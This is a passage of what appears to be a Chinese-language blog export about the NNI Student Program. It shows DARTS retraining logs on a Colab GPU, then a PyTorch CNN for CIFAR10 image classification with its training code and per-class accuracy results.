[599&#x2F;600] Step 360&#x2F;520 Loss 0.070 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:32] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 370&#x2F;520 Loss 0.070 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:34] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 380&#x2F;520 Loss 0.070 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:37] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 390&#x2F;520 Loss 0.071 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:39] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 400&#x2F;520 Loss 0.071 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:42] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 410&#x2F;520 Loss 0.071 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:44] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 420&#x2F;520 Loss 0.071 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:47] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 430&#x2F;520 Loss 0.071 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:49] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 440&#x2F;520 Loss 0.071 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:51] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 450&#x2F;520 Loss 0.071 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:54] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 460&#x2F;520 Loss 0.070 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:56] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 470&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:59] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 480&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:01] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 490&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:03] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 500&#x2F;520 Loss 0.069 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:06] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 510&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:08] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 520&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:08] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Final Prec@1 98.7600%</span><br><span class="line">[2021-02-22 21:39:09] INFO (nni&#x2F;MainThread) Valid: [599&#x2F;600] Step 000&#x2F;104 Loss 0.146 Prec@(1,5) (96.9%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:09] INFO (nni&#x2F;MainThread) Valid: [599&#x2F;600] Step 010&#x2F;104 Loss 0.113 Prec@(1,5) (96.9%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:10] INFO (nni&#x2F;MainThread) Valid: [599&#x2F;600] Step 020&#x2F;104 Loss 0.135 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:10] INFO (nni&#x2F;MainThread) Valid: [599&#x2F;600] Step 030&#x2F;104 Loss 0.163 Prec@(1,5) (96.9%, 99.9%)</span><br><span class="line">[2021-02-22 21:39:11] INFO (nni&#x2F;MainThread) Valid: [599&#x2F;600] Step 040&#x2F;104 Loss 0.159 Prec@(1,5) (97.0%, 99.9%)</span><br><span class="line">[2021-02-22 21:39:11] INFO (nni&#x2F;MainThread) Valid: [599&#x2F;600] Step 050&#x2F;104 Loss 0.155 Prec@(1,5) (97.0%, 99.9%)</span><br><span class="line">[2021-02-22 21:39:12] INFO (nni&#x2F;MainThread) Valid: [599&#x2F;600] Step 060&#x2F;104 Loss 0.150 Prec@(1,5) (97.1%, 99.9%)</span><br><span class="line">[2021-02-22 21:39:12] INFO (nni&#x2F;MainThread) Valid: [599&#x2F;600] Step 070&#x2F;104 Loss 0.140 Prec@(1,5) (97.2%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:13] INFO (nni&#x2F;MainThread) Valid: [599&#x2F;600] Step 080&#x2F;104 Loss 0.143 Prec@(1,5) (97.2%, 99.9%)</span><br><span class="line">[2021-02-22 21:39:13] INFO (nni&#x2F;MainThread) Valid: [599&#x2F;600] Step 090&#x2F;104 Loss 0.137 Prec@(1,5) (97.3%, 99.9%)</span><br><span class="line">[2021-02-22 21:39:14] INFO (nni&#x2F;MainThread) Valid: [599&#x2F;600] Step 100&#x2F;104 Loss 0.139 Prec@(1,5) (97.2%, 99.9%)</span><br><span class="line">[2021-02-22 21:39:14] INFO (nni&#x2F;MainThread) Valid: [599&#x2F;600] Step 104&#x2F;104 Loss 0.140 Prec@(1,5) (97.2%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:14] INFO (nni&#x2F;MainThread) Valid: [599&#x2F;600] Final Prec@1 97.2400%</span><br><span class="line">[2021-02-22 21:39:14] INFO (nni&#x2F;MainThread) Epoch 599 LR 0.000001</span><br><span class="line">[2021-02-22 21:39:14] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 000&#x2F;520 Loss 0.039 Prec@(1,5) (100.0%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:17] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 010&#x2F;520 Loss 0.063 Prec@(1,5) (98.9%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:19] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 020&#x2F;520 Loss 0.061 Prec@(1,5) (98.9%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:22] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 030&#x2F;520 Loss 0.064 Prec@(1,5) (98.9%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:24] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 040&#x2F;520 Loss 0.065 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:26] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 050&#x2F;520 Loss 0.065 Prec@(1,5) (98.9%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:29] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 060&#x2F;520 Loss 0.065 Prec@(1,5) (98.9%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:31] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 070&#x2F;520 Loss 0.066 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:34] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 080&#x2F;520 Loss 0.066 Prec@(1,5) (98.9%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:36] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 090&#x2F;520 Loss 0.067 Prec@(1,5) (98.9%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:39] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 100&#x2F;520 Loss 0.067 Prec@(1,5) (98.9%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:41] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 110&#x2F;520 Loss 0.069 Prec@(1,5) (98.9%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:43] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 120&#x2F;520 Loss 0.069 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:46] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 130&#x2F;520 Loss 0.069 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:48] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 140&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:51] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 150&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:53] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 160&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:55] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 170&#x2F;520 Loss 0.071 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:58] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 180&#x2F;520 Loss 0.072 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:00] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 190&#x2F;520 Loss 0.072 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:03] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 200&#x2F;520 Loss 0.072 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:05] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 210&#x2F;520 Loss 0.072 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:08] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 220&#x2F;520 Loss 0.072 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:10] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 230&#x2F;520 Loss 0.072 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:12] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 240&#x2F;520 Loss 0.072 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:15] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 250&#x2F;520 Loss 0.071 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:17] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 260&#x2F;520 Loss 0.071 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:20] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 270&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:22] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 280&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:24] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 290&#x2F;520 Loss 0.071 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:27] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 300&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:29] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 310&#x2F;520 Loss 0.071 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:32] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 320&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:34] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 330&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:36] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 340&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:39] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 350&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:41] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 360&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:44] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 370&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:46] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 380&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:49] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 390&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:51] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 400&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:53] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 410&#x2F;520 Loss 0.071 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:56] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 420&#x2F;520 Loss 0.072 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:58] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 430&#x2F;520 Loss 0.071 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:41:01] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 440&#x2F;520 Loss 0.071 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:41:03] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 450&#x2F;520 Loss 0.071 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:41:05] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 460&#x2F;520 Loss 0.071 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:41:08] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 470&#x2F;520 Loss 0.071 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:41:10] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 480&#x2F;520 Loss 0.071 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:41:13] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 490&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:41:15] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 500&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:41:18] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 510&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:41:20] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 520&#x2F;520 Loss 0.071 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:41:20] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Final Prec@1 98.7720%</span><br><span class="line">[2021-02-22 21:41:20] INFO (nni&#x2F;MainThread) Valid: [600&#x2F;600] Step 000&#x2F;104 Loss 0.150 Prec@(1,5) (96.9%, 100.0%)</span><br><span class="line">[2021-02-22 21:41:21] INFO (nni&#x2F;MainThread) Valid: [600&#x2F;600] Step 010&#x2F;104 Loss 0.114 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 21:41:21] INFO (nni&#x2F;MainThread) Valid: [600&#x2F;600] Step 020&#x2F;104 Loss 0.136 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 21:41:22] INFO (nni&#x2F;MainThread) Valid: [600&#x2F;600] Step 030&#x2F;104 Loss 0.164 Prec@(1,5) (96.8%, 99.9%)</span><br><span class="line">[2021-02-22 21:41:22] INFO (nni&#x2F;MainThread) Valid: [600&#x2F;600] Step 040&#x2F;104 Loss 0.160 Prec@(1,5) (96.9%, 99.9%)</span><br><span class="line">[2021-02-22 21:41:23] INFO (nni&#x2F;MainThread) Valid: [600&#x2F;600] Step 050&#x2F;104 Loss 0.156 Prec@(1,5) (97.0%, 99.9%)</span><br><span class="line">[2021-02-22 21:41:24] INFO (nni&#x2F;MainThread) Valid: [600&#x2F;600] Step 060&#x2F;104 Loss 0.151 Prec@(1,5) (97.1%, 99.9%)</span><br><span class="line">[2021-02-22 21:41:24] INFO (nni&#x2F;MainThread) Valid: [600&#x2F;600] Step 070&#x2F;104 Loss 0.140 Prec@(1,5) (97.2%, 100.0%)</span><br><span class="line">[2021-02-22 21:41:25] INFO (nni&#x2F;MainThread) Valid: [600&#x2F;600] Step 080&#x2F;104 Loss 0.143 Prec@(1,5) (97.2%, 99.9%)</span><br><span class="line">[2021-02-22 21:41:25] INFO (nni&#x2F;MainThread) Valid: [600&#x2F;600] Step 090&#x2F;104 Loss 0.137 Prec@(1,5) (97.3%, 99.9%)</span><br><span class="line">[2021-02-22 21:41:26] INFO (nni&#x2F;MainThread) Valid: [600&#x2F;600] Step 100&#x2F;104 Loss 0.139 Prec@(1,5) (97.3%, 99.9%)</span><br><span class="line">[2021-02-22 21:41:26] INFO (nni&#x2F;MainThread) Valid: [600&#x2F;600] Step 104&#x2F;104 Loss 0.139 Prec@(1,5) (97.3%, 100.0%)</span><br><span class="line">[2021-02-22 21:41:26] INFO (nni&#x2F;MainThread) Valid: [600&#x2F;600] Final Prec@1 97.2500%</span><br></pre></td></tr></table></figure>
<p>调用<code>nni.algorithms.nas.pytorch.darts.DartsTrainer</code>可进行DARTS的架构搜索。再通过<code>retrain.py</code>再次进行训练，最终在第454个epoch达到了97%的准确率，重训练过程中精确度最高能够达到98%。</p>
<p>由于DARTS的候选边在MobileNet中并没有出现，所以最终生成的模型相对变化较大，但与此同时，性能上的提升也十分明显。</p>
<h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><ul>
<li><p>我们使用了Google Colab上的GPU进行训练，通过NNI的官方文档提供的指导说明，通过反向代理访问到了NNI的Web UI，使得我们能够在有限的算力下完成NNI的有关实验。</p>
</li>
<li><p>在算力允许的条件下，每一次trial的epoch最好设置得足够大，这样所得的模型最终结果相对能够更加精确。</p>
</li>
<li><p>NNI在超参调优和神经网络架构搜索方面真正解决了用户痛点所在，省下了繁琐的人工调参以及模型优化时间，以更低的时间成本，更高的工作效率为相关学习研究提供很大的方便。</p>
</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>NNI Student Program 2020-Task2</title>
    <url>/2021/01/08/NNI-Student-Program-2020-Task2/</url>
    <content><![CDATA[<h1 id="Task2-进阶任务-HPO-NAS"><a href="#Task2-进阶任务-HPO-NAS" class="headerlink" title="Task2 进阶任务 HPO+NAS"></a>Task2 进阶任务 HPO+NAS</h1><h2 id="Task-2-1"><a href="#Task-2-1" class="headerlink" title="Task 2.1"></a>Task 2.1</h2><h3 id="CIFAR10简介"><a href="#CIFAR10简介" class="headerlink" title="CIFAR10简介"></a>CIFAR10简介</h3><p>CIFAR10数据集共有60000张分辨率为32*32的彩色图像，分为十类，每类都有6000张图像。</p>
<p>50000张图像构成训练集，10000张图像构成测试集。</p>
<img data-src="http://qiniu.garen-wang.top/static/images/NNI-Student-Program-2020-Task2/1.png">

<h3 id="实现流程"><a href="#实现流程" class="headerlink" title="实现流程"></a>实现流程</h3><p>我们使用PyTorch编写卷积神经网络来解决这项图像分类任务。</p>
<p>大体流程如下：</p>
<ol>
<li>使用torchvision下载数据集，读取数据集</li>
<li>定义解决该问题的卷积神经网络</li>
<li>训练神经网络</li>
<li>测试神经网络</li>
</ol>
<p>代码中的神经网络有两个卷积层：</p>
<ol>
<li>第一层，3个输入（RGB），6个输出。</li>
<li>第二层，6个输入，16个输出。</li>
</ol>
<p>池化层通过<code>torch.nn.MaxPool2d</code>来创建。</p>
<p>然后定义三个全连接函数：</p>
<ol>
<li>第一个，将16*5*5个节点连接至120个节点。</li>
<li>第二个，将120个节点连接到84个节点。</li>
<li>第三个，将84个节点连接到10个节点，即对应分类。</li>
</ol>
<p>激活函数全程使用Relu函数。</p>
<p>误差函数使用交叉熵函数，优化方法使用SGD。</p>
<a id="more"></a>
<h3 id="实验配置"><a href="#实验配置" class="headerlink" title="实验配置"></a>实验配置</h3><p>使用Anaconda环境下的Python3.8，使用PyCharm运行程序。</p>
<p>设置程序不使用GPU，只用CPU完成训练。</p>
<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>我们利用了<code>torch.nn</code>模块定义了本任务的神经网络。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NeuralNet</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(NeuralNet, self).__init__()</span><br><span class="line">        self.conv1 = nn.Conv2d(<span class="number">3</span>, <span class="number">6</span>, <span class="number">5</span>)</span><br><span class="line">        self.pool = nn.MaxPool2d(<span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line">        self.conv2 = nn.Conv2d(<span class="number">6</span>, <span class="number">16</span>, <span class="number">5</span>)</span><br><span class="line">        self.func1 = nn.Linear(<span class="number">16</span> * <span class="number">5</span> * <span class="number">5</span>, <span class="number">120</span>)</span><br><span class="line">        self.func2 = nn.Linear(<span class="number">120</span>, <span class="number">84</span>)</span><br><span class="line">        self.func3 = nn.Linear(<span class="number">84</span>, <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        x = self.pool(F.relu(self.conv1(x)))</span><br><span class="line">        x = self.pool(F.relu(self.conv2(x)))</span><br><span class="line">        x = x.view(-<span class="number">1</span>, <span class="number">16</span> * <span class="number">5</span> * <span class="number">5</span>) <span class="comment"># -1 means uncertain number</span></span><br><span class="line">        x = F.relu(self.func1(x))</span><br><span class="line">        x = F.relu(self.func2(x))</span><br><span class="line">        x = self.func3(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>而训练过程中，使用PyTorch的写法是这样的：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train</span>(<span class="params">trainloader, path</span>):</span></span><br><span class="line">    neuralnet = NeuralNet()</span><br><span class="line">    criterion = nn.CrossEntropyLoss()</span><br><span class="line">    optimizer = optim.SGD(neuralnet.parameters(), lr=<span class="number">0.001</span>, momentum=<span class="number">0.9</span>)</span><br><span class="line">    <span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        running_loss = <span class="number">0.0</span></span><br><span class="line">        <span class="keyword">for</span> i, data <span class="keyword">in</span> <span class="built_in">enumerate</span>(trainloader, <span class="number">0</span>):</span><br><span class="line">            inputs, labels = data</span><br><span class="line">            <span class="comment"># training template for PyTorch</span></span><br><span class="line">            optimizer.zero_grad()</span><br><span class="line">            outputs = neuralnet(inputs)</span><br><span class="line">            loss = criterion(outputs, labels)</span><br><span class="line">            loss.backward()</span><br><span class="line">            optimizer.step()</span><br><span class="line"></span><br><span class="line">            running_loss += loss.item()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> i % <span class="number">2000</span> == <span class="number">1999</span>:</span><br><span class="line">                print(<span class="string">&#x27;[%5d, %5d] loss = %.5f&#x27;</span> % (epoch + <span class="number">1</span>, i + <span class="number">1</span>, running_loss / <span class="number">2000</span>))</span><br><span class="line">                running_loss = <span class="number">0.0</span></span><br><span class="line"></span><br><span class="line">    torch.save(neuralnet.state_dict(), path)</span><br><span class="line">    print(<span class="string">&#x27;Training Finished&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="结果分析"><a href="#结果分析" class="headerlink" title="结果分析"></a>结果分析</h3><p>经10个epoch的训练，最终输出结果如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\12058\anaconda3\python.exe C:&#x2F;Users&#x2F;12058&#x2F;Documents&#x2F;GitHub&#x2F;nni-learning&#x2F;task2&#x2F;2.1&#x2F;main.py</span><br><span class="line">[    1,  2000] loss &#x3D; 2.16590</span><br><span class="line">[    1,  4000] loss &#x3D; 1.82480</span><br><span class="line">[    1,  6000] loss &#x3D; 1.64638</span><br><span class="line">[    1,  8000] loss &#x3D; 1.56156</span><br><span class="line">[    1, 10000] loss &#x3D; 1.49378</span><br><span class="line">[    1, 12000] loss &#x3D; 1.46539</span><br><span class="line">[    2,  2000] loss &#x3D; 1.39108</span><br><span class="line">[    2,  4000] loss &#x3D; 1.38308</span><br><span class="line">[    2,  6000] loss &#x3D; 1.36254</span><br><span class="line">[    2,  8000] loss &#x3D; 1.30314</span><br><span class="line">[    2, 10000] loss &#x3D; 1.30563</span><br><span class="line">[    2, 12000] loss &#x3D; 1.26935</span><br><span class="line">[    3,  2000] loss &#x3D; 1.21411</span><br><span class="line">[    3,  4000] loss &#x3D; 1.21809</span><br><span class="line">[    3,  6000] loss &#x3D; 1.17786</span><br><span class="line">[    3,  8000] loss &#x3D; 1.18651</span><br><span class="line">[    3, 10000] loss &#x3D; 1.16956</span><br><span class="line">[    3, 12000] loss &#x3D; 1.16728</span><br><span class="line">[    4,  2000] loss &#x3D; 1.10504</span><br><span class="line">[    4,  4000] loss &#x3D; 1.11141</span><br><span class="line">[    4,  6000] loss &#x3D; 1.07836</span><br><span class="line">[    4,  8000] loss &#x3D; 1.10194</span><br><span class="line">[    4, 10000] loss &#x3D; 1.07333</span><br><span class="line">[    4, 12000] loss &#x3D; 1.06928</span><br><span class="line">[    5,  2000] loss &#x3D; 0.98897</span><br><span class="line">[    5,  4000] loss &#x3D; 1.01186</span><br><span class="line">[    5,  6000] loss &#x3D; 1.01296</span><br><span class="line">[    5,  8000] loss &#x3D; 1.01628</span><br><span class="line">[    5, 10000] loss &#x3D; 1.02610</span><br><span class="line">[    5, 12000] loss &#x3D; 1.03693</span><br><span class="line">[    6,  2000] loss &#x3D; 0.94843</span><br><span class="line">[    6,  4000] loss &#x3D; 0.94470</span><br><span class="line">[    6,  6000] loss &#x3D; 0.96298</span><br><span class="line">[    6,  8000] loss &#x3D; 0.96035</span><br><span class="line">[    6, 10000] loss &#x3D; 0.98843</span><br><span class="line">[    6, 12000] loss &#x3D; 0.96657</span><br><span class="line">[    7,  2000] loss &#x3D; 0.87795</span><br><span class="line">[    7,  4000] loss &#x3D; 0.90013</span><br><span class="line">[    7,  6000] loss &#x3D; 0.91402</span><br><span class="line">[    7,  8000] loss &#x3D; 0.94256</span><br><span class="line">[    7, 10000] loss &#x3D; 0.93912</span><br><span class="line">[    7, 12000] loss &#x3D; 0.91624</span><br><span class="line">[    8,  2000] loss &#x3D; 0.84444</span><br><span class="line">[    8,  4000] loss &#x3D; 0.85796</span><br><span class="line">[    8,  6000] loss &#x3D; 0.90461</span><br><span class="line">[    8,  8000] loss &#x3D; 0.89855</span><br><span class="line">[    8, 10000] loss &#x3D; 0.89341</span><br><span class="line">[    8, 12000] loss &#x3D; 0.89116</span><br><span class="line">[    9,  2000] loss &#x3D; 0.79060</span><br><span class="line">[    9,  4000] loss &#x3D; 0.83296</span><br><span class="line">[    9,  6000] loss &#x3D; 0.84468</span><br><span class="line">[    9,  8000] loss &#x3D; 0.85216</span><br><span class="line">[    9, 10000] loss &#x3D; 0.86738</span><br><span class="line">[    9, 12000] loss &#x3D; 0.87915</span><br><span class="line">[   10,  2000] loss &#x3D; 0.76653</span><br><span class="line">[   10,  4000] loss &#x3D; 0.80672</span><br><span class="line">[   10,  6000] loss &#x3D; 0.82791</span><br><span class="line">[   10,  8000] loss &#x3D; 0.80691</span><br><span class="line">[   10, 10000] loss &#x3D; 0.83649</span><br><span class="line">[   10, 12000] loss &#x3D; 0.84138</span><br><span class="line">Training Finished</span><br><span class="line">Accuracy of plane: 81.14%</span><br><span class="line">Accuracy of car: 92.10%</span><br><span class="line">Accuracy of bird: 74.58%</span><br><span class="line">Accuracy of cat: 47.94%</span><br><span class="line">Accuracy of deer: 65.08%</span><br><span class="line">Accuracy of dog: 61.28%</span><br><span class="line">Accuracy of frog: 71.88%</span><br><span class="line">Accuracy of horse: 73.24%</span><br><span class="line">Accuracy of ship: 86.18%</span><br><span class="line">Accuracy of truck: 66.52%</span><br><span class="line">Testing Finished</span><br><span class="line"></span><br><span class="line">Process finished with exit code 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可以看出，损失值总体稳定下降，对车、飞机、船等图像分类准确率较高，而对猫、狗、卡车等图像的准确率较不理想。</p>
<p>如何提高部分不理想的分类准确率？请看Task 2.2……</p>
